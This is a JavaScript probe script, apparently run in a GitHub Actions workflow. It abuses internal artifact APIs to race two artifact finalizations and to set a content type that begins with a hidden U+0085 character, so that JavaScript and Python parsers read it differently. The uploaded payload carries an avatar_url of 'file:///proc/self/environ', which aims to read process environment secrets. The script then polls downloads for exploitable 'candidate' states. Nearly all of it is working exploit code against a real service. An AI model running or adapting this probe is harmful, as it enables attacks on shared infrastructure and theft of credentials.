import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';

const twirp = internalArtifactTwirpClient();
const backend = getBackendIdsFromToken();
const repo = process.env.GITHUB_REPOSITORY;
const root = `https://api.github.com/repos/${repo}`;
const weird = '\u0085application/json';
const token = process.env.GITHUB_TOKEN;
const pause = ms => new Promise(resolve => setTimeout(resolve, ms));
const headers = {
  Authorization: `Bearer ${token}`,
  Accept: 'application/vnd.github.v3+json',
  'User-Agent': 'repo-cassette-transient-probe',
};

function payload(id) {
  return Buffer.from(JSON.stringify({
    full_name: `${repo}/actions/artifacts/${id}/zip`,
    owner: { avatar_url: 'file:///proc/self/environ' },
  }));
}

async function create(name, version) {
  const mime = version === 6 ? weird : 'application/json';
  const result = await twirp.CreateArtifact({
    ...backend, name, version, mimeType: StringValue.create({ value: mime }),
  });
  if (!result.ok || !result.signedUploadUrl) throw Error(`Create v${version} failed`);
  return { version, url: result.signedUploadUrl };
}

async function upload(url, data) {
  const blob = new BlobClient(url).getBlockBlobClient();
  await blob.uploadData(data, {
    blobHTTPHeaders: { blobContentType: weird },
  });
}

async function finalize(name, size) {
  const result = await twirp.FinalizeArtifact({ ...backend, name, size: String(size) });
  if (!result.ok || !result.artifactId) throw Error('Finalize failed');
  return String(result.artifactId);
}

async function inspect(id) {
  const first = await fetch(`${root}/actions/artifacts/${id}/zip`, {
    headers, redirect: 'manual', signal: AbortSignal.timeout(4000),
  });
  if (first.status !== 302) return { id, status: first.status };
  const location = first.headers.get('location');
  if (!location?.startsWith('https://')) return { id, status: first.status, error: 'no https location' };
  const response = await fetch(location, { signal: AbortSignal.timeout(4000) });
  const data = Buffer.from(await response.arrayBuffer());
  const ct = response.headers.get('content-type') ?? '';
  const head = ct.split(',')[0].split(';')[0];
  const js = head.trim().toLowerCase();
  const py = head.replace(/^[\s\u0085]+|[\s\u0085]+$/gu, '').toLowerCase();
  return {
    id, status: response.status, ct, match: data.equals(payload(id)),
    candidate: response.ok && data.equals(payload(id)) && js !== 'application/json' && py === 'application/json',
  };
}

async function remove(id) {
  const response = await fetch(`${root}/actions/artifacts/${id}`, {
    method: 'DELETE', headers, signal: AbortSignal.timeout(4000),
  });
  console.log('DELETE', JSON.stringify({ id, status: response.status }));
}

const patterns = [
  [6, 7, 0], [7, 6, 0],
  [6, 7, 10], [7, 6, 10],
  [6, 7, 50], [7, 6, 50],
  [6, 7, 150], [7, 6, 150],
  [6, 7, 500], [7, 6, 500],
];
let candidates = 0;
for (let i = 0; i < patterns.length; i++) {
  const [firstVersion, secondVersion, delay] = patterns[i];
  const name = `transient-${process.env.GITHUB_RUN_ID}-${i}`;
  const ids = new Set();
  const seen = new Set();
  let found = false;
  try {
    const handles = await Promise.all([
      create(name, firstVersion), create(name, secondVersion),
    ]);
    await Promise.all(handles.map(handle => upload(handle.url, Buffer.from('{}'))));
    const firstId = await finalize(name, 2);
    ids.add(firstId);
    await Promise.all(handles.map(handle => upload(handle.url, payload(firstId))));
    const start = Date.now();
    let second = null;
    while (Date.now() - start < 1800) {
      if (!second && Date.now() - start >= delay) {
        second = finalize(name, 2).then(id => { ids.add(id); return id; }).catch(error => {
          console.log('FINALIZE_ERROR', JSON.stringify({ i, error: String(error).slice(0,120) }));
          return null;
        });
      }
      for (const id of ids) {
        try {
          const result = await inspect(id);
          const key = `${result.id}:${result.status}:${result.ct}:${result.match}`;
          if (!seen.has(key)) {
            seen.add(key);
            console.log('STATE', JSON.stringify({ i, ageMs: Date.now()-start, ...result }));
          }
          if (result.candidate) found = true;
        } catch (error) {
          console.log('POLL_ERROR', JSON.stringify({ i, error: String(error).slice(0,120) }));
        }
      }
      await pause(20);
    }
    if (second) await second;
    for (const id of ids) {
      const result = await inspect(id);
      console.log('FINAL_STATE', JSON.stringify({ i, ...result }));
      if (result.candidate) found = true;
    }
  } catch (error) {
    console.log('ATTEMPT_ERROR', JSON.stringify({ i, error: String(error).slice(0,180) }));
  }
  if (found) {
    candidates++;
    console.log('CANDIDATE', JSON.stringify({ i, ids: [...ids] }));
  } else {
    for (const id of ids) {
      try { await remove(id); } catch (error) {
        console.log('DELETE_ERROR', JSON.stringify({ id, error: String(error).slice(0,120) }));
      }
    }
  }
}
console.log('SUMMARY', JSON.stringify({ attempts: patterns.length, candidates }));
